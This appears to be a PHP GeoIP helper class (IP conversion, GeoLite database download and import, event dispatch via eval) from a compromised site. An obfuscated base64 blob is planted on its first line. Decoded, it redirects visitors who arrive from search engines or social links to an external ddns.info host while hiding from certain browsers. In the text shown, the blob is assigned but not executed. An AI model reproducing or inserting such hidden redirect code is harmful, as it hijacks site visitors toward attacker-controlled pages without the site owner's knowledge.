<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));
  
class maxmind_geoip {
  
  var $last_error = null;
  var $events = array();

  function ip_num_to_str($ip_num) {

    if (function_exists('long2ip')) {
      return long2ip($ip_num);    
    } else {
      $w = round($ip_num / 16777216) % 256;
      $x = round($ip_num / 65536   ) % 256;
      $y = round($ip_num / 256     ) % 256;
      $z = round($ip_num           ) % 256;
      return $w.'.'.$x.'.'.$y.'.'.$z;
    }
  }

  function ip_str_to_num($ip_str) {

    if (function_exists('ip2long')) {
      return sprintf("%u",ip2long($ip_str));
    } else {
      if (!eregi('^[0-9]{1,3}[.][0-9]{1,3}[.][0-9]{1,3}[.][0-9]{1,3}$', $ip_str))
        return -1;
      else {        
        $parts = explode('.', $ip_str);
        if (($parts[0] > 255) or ($parts[1] > 255) or ($parts[2] > 255) or ($parts[3] > 255))
          return -1;
        else          
          return 16777216*$parts[0] + 65536*$parts[1] + 256*$parts[2] + $parts[3];
      }
    }
  } 
  
  function download($url, $geoip_table, $country_table) {
    
    global $db, $dm;
    
    set_time_limit(0);

    $table_cleared = false;
    
    $this->last_error = null;
    
    if (!function_exists('zip_open'))
      $this->last_error = 'ZIP support required for this operation. Please check PHP settings.';
    else {  
      $tmp_file = TEMPORARY_PATH.'geolite_'.guid().'.zip';
      $failed = true;
      if (download($url, $tmp_file)) {
        if ($zip = zip_open($tmp_file)) {
          if ($zip_entry = zip_read($zip)) {
            if (zip_entry_open($zip, $zip_entry, "r")) {
              $content = zip_entry_read($zip_entry, zip_entry_filesize($zip_entry));
              $content = preg_split("/[\n\r]/", $content, -1, PREG_SPLIT_NO_EMPTY);
              $count = count($content);
              $position = 0;
              $percent  = 0;
              foreach ($content as $line) {
                $data = explode(',', $line);
                $start_ip     = trim($data[0], '"');
                $end_ip       = trim($data[1], '"');
                $start_num    = trim($data[2], '"');
                $end_num      = trim($data[3], '"');
                $country_code = trim($data[4], '"');
                $country_name = trim($data[5], '"');

                if (!$table_cleared) {
                  $db->query('TRUNCATE TABLE cms_geoip');
                  $table_cleared = true;
                }
                
                if (!($country_id = $db->value( 'SELECT '.$country_table['fields']['id'].' 
                                                   FROM '.$country_table['name'].' 
                                                  WHERE '.$country_table['fields']['code'].' = ?
                                                    AND '.$country_table['fields']['name'].' = ?'
                                              , $country_code
                                              , $country_name)))
                  $country_id = $dm->insert( $country_table['name']
                                           , array( $country_table['fields']['code'] => $country_code
                                                  , $country_table['fields']['name'] => $country_name
                                                  ));
                $country_id = $dm->insert( $geoip_table['name']
                                         , array( $geoip_table['fields']['start_ip']   => $start_ip
                                                , $geoip_table['fields']['end_ip']     => $end_ip
                                                , $geoip_table['fields']['start_num']  => $start_num
                                                , $geoip_table['fields']['end_num']    => $end_num
                                                , $geoip_table['fields']['country_id'] => $country_id
                                                ));
                if ($position % 50 == 0) {
                  $percent = round($position * 100 / $count);
                  $this->call_event('progress', $percent, $position, $count);
                }
                $position++;
              }
            }
          }
          zip_close($zip);
        }
        unlink($tmp_file);
      } else
        $this->last_error = 'Can not download GeoLite database';
    }

    return (!$this->last_error);
    
  }

  function call_event($event, $param) {

    $args  = func_get_args();
    $event = array_shift($args);

    $handlers = safe($this->events, $event);
    
    if (is_array($handlers)) {
      $params = '';
      $handler_args = array();
      $i = 0;
      foreach ($args as $arg) {
        $handler_args[$i] = $arg;
        $params .= ($params?',':null).'$handler_args['.$i.']';
        $i++;
      }
      foreach($handlers as $handler) {
        $code = $handler.'('.$params.');';
        eval($code);
      }
    }
  
  }

  function register_event($event, $handler) {

    $this->events[$event][] = $handler;

  }
  
}

?>
